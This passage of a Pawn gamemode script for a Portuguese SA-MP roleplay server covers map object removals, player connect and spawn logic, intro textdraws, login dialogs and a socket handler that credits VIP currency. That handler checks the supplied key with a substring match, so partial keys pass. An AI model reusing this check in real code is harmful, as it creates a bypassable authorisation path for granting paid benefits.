	RemoveBuildingForPlayer(playerid, 1267, 2062.0313, -1826.6406, 19.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1855.7188, -1741.5391, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1879.5078, -1741.4844, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1908.2188, -1741.4844, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1929.5781, -1736.9063, 21.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1931.0391, -1726.3281, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1832.3828, -1694.3125, 9.7188, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1832.8984, -1670.7656, 9.7188, 0.25);
	RemoveBuildingForPlayer(playerid, 5408, 1873.7422, -1682.4766, 34.7969, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1931.0391, -1702.2891, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1929.5781, -1694.4609, 21.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1931.0391, -1667.0313, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1931.0391, -1637.8984, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1855.7188, -1623.2813, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1879.5078, -1623.1016, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 1891.9688, -1622.0000, 12.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1908.2188, -1622.9844, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1929.5781, -1627.6250, 21.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 1283, 1833.0234, -1611.4766, 15.6406, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1857.5469, -1608.1172, 16.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 1870.2578, -1602.8047, 12.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1883.8203, -1616.4297, 16.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1908.2813, -1608.1172, 16.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 5476, 1883.5234, -1576.4453, 20.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 5630, 1928.4922, -1575.9688, 20.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 1307, 1931.7422, -1569.8828, 12.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 5422, 2071.4766, -1831.4219, 14.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 17750, 2803.3984, -1573.8047, 20.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 17752, 2809.7031, -1616.8203, 18.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 17756, 2497.7656, -1762.3906, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 3716, 2730.5391, -1641.4531, 20.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 710, 2730.0469, -1627.6250, 26.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2489.0859, -1744.2109, 16.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 17520, 2497.7656, -1762.3906, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 3715, 2730.5391, -1641.4531, 20.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2836.7656, -1643.1328, 10.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2872.6953, -1641.3672, 8.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2730.2656, -1606.5313, 11.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 17904, 2769.2422, -1624.2266, 19.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 17549, 2809.7031, -1616.8203, 18.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 17541, 2803.3984, -1573.8047, 20.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 6107, 1251.7891, -1541.2813, 36.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 6108, 1268.2422, -1467.8438, 11.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 6109, 1219.8984, -1449.4375, 29.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 6195, 1236.5234, -1488.1641, 40.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 6224, 1264.0469, -1488.3516, 21.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1097.4297, -1699.4219, 14.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1210.3125, -1559.0000, 12.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1218.2813, -1554.0859, 15.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 792, 1219.8516, -1561.3359, 12.6172, 0.25);
	RemoveBuildingForPlayer(playerid, 638, 1229.1484, -1557.6484, 13.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 638, 1232.0391, -1560.5234, 13.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1210.6484, -1546.8125, 12.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1218.2813, -1540.9453, 15.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 792, 1219.8516, -1547.8984, 12.6172, 0.25);
	RemoveBuildingForPlayer(playerid, 6100, 1251.7891, -1541.2813, 36.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1210.7188, -1525.4375, 12.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 6223, 1264.0469, -1488.3516, 21.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 6099, 1219.8984, -1449.4375, 29.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 6101, 1268.2422, -1467.8438, 11.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 792, 820.9297, -2066.1797, 12.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 792, 851.7969, -2066.3594, 12.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 5930, 1134.2500, -1338.0781, 23.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 5934, 1076.7109, -1358.0938, 15.4453, 0.25);
	RemoveBuildingForPlayer(playerid, 5950, 837.4141, -1361.2188, 10.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 5951, 958.8203, -1359.8672, 17.9688, 0.25);
	RemoveBuildingForPlayer(playerid, 5965, 887.9766, -1372.4063, 18.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 5975, 1014.0234, -1361.4609, 20.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 6002, 931.2266, -1357.3281, 25.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 6003, 954.6875, -1305.7734, 30.1406, 0.25);
	RemoveBuildingForPlayer(playerid, 1266, 907.7656, -1374.6484, 28.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1261, 958.3359, -1377.3203, 24.1328, 0.25);
	RemoveBuildingForPlayer(playerid, 716, 876.4219, -1389.3359, 12.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 5780, 889.1094, -1375.6641, 18.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 5781, 887.9766, -1372.4063, 18.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 716, 896.5625, -1389.3359, 12.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 5783, 908.5391, -1384.3281, 24.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1260, 907.7656, -1374.6484, 28.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1307, 926.1484, -1383.7266, 12.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1283, 918.2422, -1384.4141, 15.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 5773, 837.4141, -1361.2188, 10.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 5814, 931.2266, -1357.3281, 25.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 716, 944.9063, -1389.3359, 12.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 1297, 975.8125, -1391.0938, 15.6406, 0.25);
	RemoveBuildingForPlayer(playerid, 1307, 969.2734, -1385.3984, 12.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 1438, 981.8750, -1385.9922, 12.6484, 0.25);
	RemoveBuildingForPlayer(playerid, 1307, 1019.8359, -1386.5156, 12.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 1267, 958.3359, -1377.3203, 24.1328, 0.25);
	RemoveBuildingForPlayer(playerid, 5813, 958.8203, -1359.8672, 17.9688, 0.25);
	RemoveBuildingForPlayer(playerid, 5732, 1014.0234, -1361.4609, 20.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 716, 1026.8672, -1389.3359, 12.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 5731, 1076.7109, -1358.0938, 15.4453, 0.25);
	RemoveBuildingForPlayer(playerid, 5818, 954.6875, -1305.7734, 30.1406, 0.25);
	RemoveBuildingForPlayer(playerid, 5708, 1134.2500, -1338.0781, 23.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 1440, 1148.6797, -1385.1875, 13.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 1283, 1190.3047, -1389.8047, 15.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1297, 1190.7734, -1383.2734, 15.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 6339, 570.0625, -1363.0625, 31.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 6374, 335.1016, -1423.6094, 39.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 6375, 280.2031, -1450.1563, 26.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 6454, 379.7266, -1945.9531, -1.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 6455, 379.5391, -2050.8672, -1.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 6456, 397.5391, -1848.4922, 12.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 6459, 387.8906, -1900.4375, 9.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 6460, 387.5781, -1918.3672, 8.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 6463, 389.7734, -2028.4688, 19.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 6464, 379.0625, -2065.0234, 11.7969, 0.25);
	RemoveBuildingForPlayer(playerid, 6465, 368.0547, -2028.2422, 8.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 6481, 460.2734, -1401.9688, 30.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2028.5000, 32.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2021.6406, 29.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2017.4531, 24.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2017.4297, 16.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2021.6328, 10.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2028.5156, 8.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2035.3984, 10.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2039.6406, 16.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2039.6563, 24.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2035.3828, 29.9531, 0.25);
	RemoveBuildingForPlayer(playerid, 6491, 717.4844, -1357.3047, 20.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1529, 399.0078, -2066.8828, 11.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 6518, 310.3438, -1546.9688, 69.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 6519, 336.9453, -1426.6484, 42.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1266, 213.3750, -1494.7578, 20.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 1266, 282.4219, -1469.5078, 42.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 733, 255.0156, -1588.4922, 31.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 729, 259.8047, -1613.3594, 32.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 306.5781, -1599.6250, 32.6563, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 272.1172, -1593.8906, 32.7734, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 169.6719, -1498.0859, 10.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 1260, 213.3672, -1494.7656, 20.8594, 0.25);
	RemoveBuildingForPlayer(playerid, 1260, 282.4219, -1469.5156, 42.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 716, 295.0938, -1480.9453, 32.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 716, 306.2969, -1471.4609, 32.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 311.0859, -1469.8125, 36.9219, 0.25);
	RemoveBuildingForPlayer(playerid, 6350, 247.3906, -1454.8281, 37.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 6373, 280.2031, -1450.1563, 26.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 716, 320.0234, -1459.9609, 33.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 6368, 335.1016, -1423.6094, 39.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 6352, 459.2578, -1402.9063, 31.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 6351, 460.2734, -1401.9688, 30.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 535.2969, -1396.6797, 14.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 549.7031, -1392.6719, 13.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 600.1563, -1384.4375, 12.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 6336, 570.0625, -1363.0625, 31.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 6490, 717.4844, -1357.3047, 20.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 6516, 717.6875, -1357.2813, 18.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 360.4531, -2086.6719, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 353.0156, -2081.1875, 6.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 368.9297, -2083.2656, 7.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 353.0156, -2050.4844, 6.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 364.6094, -2036.1797, 9.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 6462, 368.0547, -2028.2422, 8.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 364.6094, -1972.5547, 9.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 6466, 374.6953, -2054.8828, 8.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 374.7969, -2046.9375, 9.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 374.7969, -2006.1563, 9.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 374.7969, -1942.5391, 9.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 378.4609, -1941.6875, 7.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 378.4609, -1963.8828, 7.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 378.4609, -1989.5234, 7.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 378.4609, -2012.9297, 7.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 378.4609, -2083.2656, 7.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 716, 363.5391, -1899.5938, 6.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 364.6094, -1910.2813, 9.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1368, 361.5469, -1859.0313, 7.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 716, 375.8516, -1873.2422, 6.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 374.7969, -1871.2656, 9.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 377.4531, -1915.7891, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 377.4531, -1897.2813, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 377.4531, -1867.1719, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 378.4609, -1874.5703, 7.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 378.4609, -1902.8203, 7.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 364.6094, -1841.3906, 9.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1461, 360.8281, -1849.4766, 7.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1368, 361.5469, -1836.5156, 7.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 1461, 360.8281, -1833.1953, 7.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 374.7969, -1841.3906, 9.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 377.4531, -1848.6641, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 377.4531, -1831.1172, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1368, 361.5469, -1812.6406, 7.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 377.4531, -1812.6094, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1368, 378.0234, -1821.9922, 7.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 1461, 360.8281, -1809.4453, 7.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 374.7969, -1802.4531, 9.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 364.6094, -1802.4531, 9.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 379.7422, -2086.8594, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 381.0313, -2070.9375, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 6283, 379.0625, -2065.0234, 11.7969, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2055.1016, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 386.5703, -2061.9531, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 6300, 379.5391, -2050.8672, -1.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2042.4922, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2030.3359, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2016.7500, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 386.5703, -2049.3516, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1340, 388.8594, -2071.6641, 7.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 390.2031, -2083.2656, 7.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2039.6406, 16.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2039.6563, 24.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 6298, 389.7734, -2028.4688, 19.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 6461, 389.7734, -2028.5000, 20.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2028.5000, 32.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2021.6406, 29.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2017.4531, 24.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2017.4297, 16.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2021.6328, 10.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2028.5156, 8.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2035.3984, 10.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2035.3828, 29.9531, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 400.3906, -2086.4219, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 400.7578, -2081.1875, 6.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 400.7578, -2050.4844, 6.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 6458, 379.5781, -1946.3047, 10.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 6450, 379.7266, -1945.9531, -1.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 384.4297, -1929.8047, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 384.4297, -1904.1328, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 384.4297, -1874.0313, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 384.4297, -1855.5234, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 384.4297, -1837.9766, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1368, 381.7969, -1834.9219, 7.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 1371, 387.1328, -1831.4453, 7.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 6457, 385.0859, -1823.6484, 10.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 1368, 381.7969, -1809.3594, 7.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 6299, 387.5781, -1918.3672, 8.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 6289, 387.8906, -1900.4375, 9.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 6288, 397.5391, -1848.4922, 12.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 1500, 387.5625, -1817.0859, 6.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 284.5391, -1627.3125, 32.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 293.5391, -1628.4922, 32.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 305.6719, -1624.8359, 32.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 309.4375, -1613.0781, 32.7891, 0.25);

	SetPlayerPos(playerid, 1000, 1000, 1000);
	SetPlayerInterior(playerid, 10);
	
    Logged[playerid] = false;
    
	JoinLog(playerid);
	
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	
	if(TemSlotReservado(playerid) == 1) currentSlots--;
	
	if(!IsRPName(name)) return KickPlayer(playerid, "Doge", "Nome Non-RP. Exemplo: Nuno_Costa");
	if(GetOnlinePlayers() >= (MAX_PLAYERS - currentSlots) && TemSlotReservado(playerid) == 0) return KickPlayer(playerid, "Doge", "Esse slot está reservado");

	PlayAudioStreamForPlayer(playerid, "https://cld.pt/dl/download/629656f3-dc8e-4c21-a1ee-928cb5bad2aa/pcrp.mp3");

	CarregarPlayerTextDraws(playerid);
 	CarregarMapasRemove(playerid);
 	TogglePlayerAllDynamicAreas(playerid, true);
     
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
    if(TemSlotReservado(playerid) == 1) currentSlots++;
    
	new Float:x, Float:y, Float:z, VW, Int;

	GetPlayerPos(playerid, x, y, z);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	pInfo[playerid][SpawnX] = x;
	pInfo[playerid][SpawnY] = y;
	pInfo[playerid][SpawnZ] = z;
	pInfo[playerid][SpawnVirtualWorld] = VW;
	pInfo[playerid][SpawnInterior] = Int;
    
	if(Logged[playerid] == true)
	{
		GuardarJogador(playerid);
	}
	if(PuxadorID[playerid] != INVALID_PLAYER_ID)
	{
	    KillTimer(TimerPuxarJogador[PuxadorID[playerid]]);
	}
	
 	KillTimer(TimerPuxarJogador[playerid]);
	
	KillTimer(TimerUpdateJogador[playerid]);
	KillTimer(TimerGuardarJogador[playerid]);
	KillTimer(TimerDroga[playerid]);
	KillTimer(TimerDrunk[playerid]);
	
	Delete3DTextLabel(UIDLabel[playerid]);
	
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
    TextDrawShowForPlayer(playerid, TDEditor_TD[0]);
    
    SetTimerEx("Intro1", 1000, false, "i", playerid);
    
    TogglePlayerSpectating(playerid, true);
    
    CleanChat(playerid);
    ResetStats(playerid);

    return 1;
}

public Intro1(playerid)
{
    TextDrawShowForPlayer(playerid, TDEditor_TD[6]); // wlp apresenta

    SetTimerEx("Intro2", 1500, false, "i", playerid);
    
	return 1;
}

public Intro2(playerid)
{
    TextDrawShowForPlayer(playerid, TDEditor_TD[3]); // linha

    SetTimerEx("Intro3", 800, false, "i", playerid);
    
	return 1;
}

public Intro3(playerid)
{
    TextDrawShowForPlayer(playerid, TDEditor_TD[4]); // linha

    SetTimerEx("Intro4", 800, false, "i", playerid);

	return 1;
}

public Intro4(playerid)
{
    TextDrawShowForPlayer(playerid, TDEditor_TD[1]); // paradise city

    SetTimerEx("Intro5", 500, false, "i", playerid);

	return 1;
}

public Intro5(playerid)
{
    TextDrawShowForPlayer(playerid, TDEditor_TD[2]); // roleplay

    SetTimerEx("Intro6", 500, false, "i", playerid);

	return 1;
}

public Intro6(playerid)
{
    TextDrawShowForPlayer(playerid, TDEditor_TD[5]); // carregar servidor

    SetTimerEx("IntroEnd", 3000, false, "i", playerid);

	return 1;
}

public IntroEnd(playerid)
{
	new sdialog[512];
	new string[128];

    if(IsPlayerRegisted(playerid))
    {
    	format(string, sizeof(string), "  {FF9900}[ {FFFFFF}PORTUGAL FUN MAPS {FF9900}]"); strcat(sdialog,string);
    	format(string, sizeof(string), "\n\n{FFFFFF}Nome da tua conta: {FF9900}%s", GetPlayerNameEx(playerid)); strcat(sdialog,string);
    	format(string, sizeof(string), "\n{FFFFFF}Status: {FF9900}Registada"); strcat(sdialog,string);
        ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "LOGIN", sdialog, "Login", "Sair");
    }
    else
    {
   		format(string, sizeof(string), "  {FF9900}[ {FFFFFF}PORTUGAL FUN MAPS {FF9900}]"); strcat(sdialog,string);
    	format(string, sizeof(string), "\n\n{FFFFFF}Nome da tua conta: {FF9900}%s", GetPlayerNameEx(playerid)); strcat(sdialog,string);
    	format(string, sizeof(string), "\n{FFFFFF}Status: {AA3333}Não registada"); strcat(sdialog,string);
        ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, "REGISTA", sdialog, "Registar", "Sair");
    }
	return 1;
}

public OnPlayerSpawn(playerid)
{
	if(pInfo[playerid][Morto] == 0)
	{
	    SetPlayerHealth(playerid, pInfo[playerid][Vida]);
	}
	
	if(pInfo[playerid][Jailed] == 1)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerPosEx(playerid, AJx, AJy, AJz);

		SendClientMessage(playerid, COLOR_INFO, "Acaba a tua sentença no Admin Jail");
	}

	if(pInfo[playerid][Preso] == 1)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerPosEx(playerid, 1583.6875, -1680.5103, 1089.5883);

		SendClientMessage(playerid, COLOR_INFO, "Acaba a tua sentença na esquadra da polícia");
	}
    
    return 1;
}

public onSocketRemoteConnect(Socket:id, remote_client[], remote_clientid)
{
	new string[128];
	
	format(string, sizeof(string), "A receber conexão de %s [ID: %d]", remote_client, remote_clientid);
 	SocketLog(string);
	
	return 1;
}

public onSocketRemoteDisconnect(Socket:id, remote_clientid)
{
    new string[128];
    
    format(string, sizeof(string), "O socket [ID: %d] foi desconectado", remote_clientid);
	SocketLog(string);
	
	return 1;
}

stock GetPlayerPeixes(playerid)
{
	return pObjects[playerid][Peixe_Corvina] + pObjects[playerid][Peixe_Congro] + pObjects[playerid][Peixe_Robalo] + pObjects[playerid][Peixe_Sargo] + pObjects[playerid][Peixe_Goraz] + pObjects[playerid][Peixe_Cavala] + pObjects[playerid][Peixe_Dourada] + pObjects[playerid][Peixe_Espada];
}

stock IsInGaragemPSP(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 100.0, 1572.9967, -1694.6641, 5.2095))
	{
		new Float:x, Float:y, Float:z;
		GetPlayerPos(playerid, x, y, z);
		
		if(z < 8) return 1;
	}
	
	return 0;
}

stock IsBoat(car)
{
    new Boat[] = { 472, 473, 493, 484, 430, 453, 452, 454 };
    for(new i = 0; i < sizeof(Boat); i++)
    {
        if(GetVehicleModel(car) == Boat[i]) return 1;
    }
    return 0;
}

stock GetDataParams(rawdata[])
{
    new output[4][64];
    
    explode(output, rawdata, ":");
    
    return output;
}

public onSocketReceiveData(Socket:id, remote_clientid, data[], data_len)
{
    new string[256], cIP[16], command[64], uid, nomeConta[64], key[64], responseArray[4][64];

    get_remote_client_ip(id, remote_clientid, cIP);
    
    format(string, sizeof(string), "O socket %s [ID: %d] enviou: %s", cIP, remote_clientid, data);
    SocketLog(string);
	
	responseArray = GetDataParams(data);
    
    command = responseArray[0];
    uid = strval(responseArray[1]);
    nomeConta = responseArray[2];
    key = responseArray[3];
	
	if(!strcmp(command, "NEW_VIP"))
	{
		new found = INVALID_PLAYER_ID;
		foreach(new i : Player)
		{
		    if(pInfo[i][UID] == uid) found = i;
		}
		
		if(found != INVALID_PLAYER_ID) // o jogador está a jogar
		{
		    if(strfind(trim(pInfo[found][Key]), trim(key), true) != -1) // a key está certa
		    {
		        format(string, sizeof(string), "O socket %s [ID: %d] adicionou golds na conta do jogador %s!", cIP, remote_clientid, GetPlayerNameEx(found));
		        SocketLog(string);
		        
		        SendClientMessage(found, COLOR_OWNER, "[VIP]: {FFFFFF}Foram adicionados 20 golds à tua conta. Obrigado por nos ajudares ;)");
		        pInfo[found][Golds] += 20;
		        
